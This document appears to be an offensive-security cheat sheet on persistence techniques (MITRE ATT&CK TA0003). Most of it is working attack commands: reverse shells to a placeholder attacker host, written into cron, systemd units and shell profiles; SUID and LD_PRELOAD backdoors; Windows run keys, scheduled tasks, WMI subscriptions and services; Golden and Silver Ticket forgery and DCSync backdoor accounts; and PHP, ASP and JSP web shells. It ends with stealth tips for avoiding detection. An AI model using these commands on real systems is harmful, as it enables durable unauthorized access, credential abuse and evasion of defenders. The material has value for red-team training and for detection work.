# Persistence — Deep Dive (TA0003)

> Maintaining access across reboots, credential changes, and detection attempts.
> Maps to MITRE ATT&CK TA0003 — Persistence.

---

## Linux Persistence

### Cron Jobs
```bash
# User cron
(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'") | crontab -

# System cron
echo "*/5 * * * * root /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'" >> /etc/crontab

# Cron directories (no crontab edit needed)
echo '#!/bin/bash' > /etc/cron.d/update
echo '*/5 * * * * root /tmp/.backdoor' >> /etc/cron.d/update
```

### SSH Keys
```bash
# Add your SSH key to authorized_keys
echo "ssh-ed25519 AAAA... attacker@kali" >> /home/user/.ssh/authorized_keys
chmod 600 /home/user/.ssh/authorized_keys

# Root access
mkdir -p /root/.ssh
echo "ssh-ed25519 AAAA... attacker@kali" >> /root/.ssh/authorized_keys
```

### Systemd Services
```bash
cat > /etc/systemd/system/update-service.service << 'EOF'
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable update-service
systemctl start update-service
```

### Shell Profile Persistence
```bash
# .bashrc / .bash_profile / .profile
echo '/bin/bash -c "bash -i >& /dev/tcp/ATTACKER/PORT 0>&1" &' >> /home/user/.bashrc

# .zshrc (if using zsh)
echo '/bin/bash -c "bash -i >& /dev/tcp/ATTACKER/PORT 0>&1" &' >> /home/user/.zshrc
```

### SUID Binary
```bash
# Copy bash and set SUID
cp /bin/bash /tmp/.suid_bash
chmod u+s /tmp/.suid_bash
# Execute with: /tmp/.suid_bash -p
```

### LD_PRELOAD / Shared Library Hijacking
```bash
# Compile malicious shared library
# #include <stdio.h>
# #include <stdlib.h>
# void __attribute__((constructor)) init() { system("REVERSE_SHELL_CMD &"); }
# gcc -shared -fPIC -o /tmp/.libhook.so hook.c

# Add to ld.so.preload
echo "/tmp/.libhook.so" >> /etc/ld.so.preload
```

### PAM Backdoor
```bash
# Modify PAM to accept a backdoor password alongside real password
# WARNING: Complex, can break auth if done wrong
# Modify pam_unix.so to accept a hardcoded password
```

---

## Windows Persistence

### Registry Run Keys
```bash
# Via evil-winrm or shell
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\temp\payload.exe"
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\temp\payload.exe"

# RunOnce (executes once then deletes)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "Update" /t REG_SZ /d "C:\temp\payload.exe"
```

### Scheduled Tasks
```bash
# Create scheduled task
schtasks /create /tn "SystemUpdate" /tr "C:\temp\payload.exe" /sc onlogon /ru SYSTEM
schtasks /create /tn "SystemUpdate" /tr "C:\temp\payload.exe" /sc minute /mo 5 /ru SYSTEM

# Via PowerShell
$action = New-ScheduledTaskAction -Execute "C:\temp\payload.exe"
$trigger = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "SystemUpdate" -RunLevel Highest
```

### Startup Folder
```bash
# User startup
copy payload.exe "C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\update.exe"

# All users startup
copy payload.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\update.exe"
```

### WMI Event Subscription
```bash
# Persistent WMI event — survives reboots, hard to detect
# PowerShell:
$FilterArgs = @{
    EventNamespace = 'root\cimv2'
    Name = 'SystemUpdate'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
    QueryLanguage = 'WQL'
}
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $FilterArgs

$ConsumerArgs = @{
    Name = 'SystemUpdate'
    CommandLineTemplate = 'C:\temp\payload.exe'
}
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $ConsumerArgs

$BindingArgs = @{
    Filter = $Filter
    Consumer = $Consumer
}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $BindingArgs
```

### Windows Service
```bash
# Create a service
sc create "WindowsUpdate" binpath= "C:\temp\payload.exe" start= auto
sc start "WindowsUpdate"

# Or via PowerShell
New-Service -Name "WindowsUpdate" -BinaryPathName "C:\temp\payload.exe" -StartupType Automatic
```

### DLL Hijacking
```bash
# Find DLL search order vulnerabilities
# 1. Use Process Monitor to find "NAME NOT FOUND" DLL loads
# 2. Place malicious DLL in the application directory
# The app loads your DLL on next execution

# Common targets: programs that load DLLs from their directory first
```

---

## Active Directory Persistence

### Golden Ticket (10-year persistence)
```bash
# Get krbtgt hash via DCSync
impacket-secretsdump DOMAIN/admin:pass@DC_IP -just-dc-user krbtgt

# Create Golden Ticket
impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-xxx -domain DOMAIN administrator

# Use anywhere, anytime
export KRB5CCNAME=administrator.ccache
impacket-psexec DOMAIN/administrator@DC_IP -k -no-pass

# Only killed by changing krbtgt password TWICE (with time between changes)
```

### Silver Ticket (Service-specific)
```bash
# Forge ticket for a specific service (CIFS, HTTP, MSSQL, etc.)
impacket-ticketer -nthash SVC_HASH -domain-sid S-1-5-21-xxx -domain DOMAIN -spn CIFS/target.domain.com administrator
```

### DCSync Rights (AdminSDHolder)
```bash
# Grant DCSync to a regular user (extremely stealthy)
# Via PowerShell on DC:
# Add-ObjectAcl -TargetDistinguishedName "DC=domain,DC=com" -PrincipalSamAccountName backdoor_user -Rights DCSync

# Now backdoor_user can DCSync anytime:
impacket-secretsdump DOMAIN/backdoor_user:pass@DC_IP -just-dc
```

### Skeleton Key
```bash
# Patches LSASS on DC to accept "mimikatz" as password for ALL accounts
# Via Mimikatz: privilege::debug → misc::skeleton
# Now: any user can auth with their real password OR "mimikatz"
# Cleared on DC reboot
```

### Machine Account Persistence
```bash
# Create a machine account (any domain user can create up to 10)
impacket-addcomputer DOMAIN/user:pass -computer-name 'FAKE01$' -computer-pass 'FakePass123!'
# This machine account persists and can be used for auth
```

---

## Web Persistence

### Web Shell
```bash
# PHP
echo '<?php if(isset($_GET["c"])){system($_GET["c"]);} ?>' > shell.php

# Encrypted PHP (Weevely)
weevely generate PASSWORD shell.php
weevely http://TARGET/shell.php PASSWORD

# ASP/ASPX
# <% eval request("c") %>

# JSP
# <% Runtime.getRuntime().exec(request.getParameter("c")); %>

# Hide in legitimate files
# Append to existing PHP file:
# <?php if(isset($_GET['z'])){system($_GET['z']);} ?>
```

---

## Stealth Tips

1. **Name things legitimately** — "WindowsUpdate", "syslogd", not "backdoor"
2. **Match timestamps** — `touch -r /bin/ls /tmp/backdoor` (copy timestamp from legit file)
3. **Hide in noise** — Place files where legitimate software exists
4. **Use multiple methods** — If one is found, others survive
5. **Avoid disk when possible** — In-memory persistence (WMI events, registry) is harder to find
6. **Don't persist from compromised user** — Move to a service account or SYSTEM first
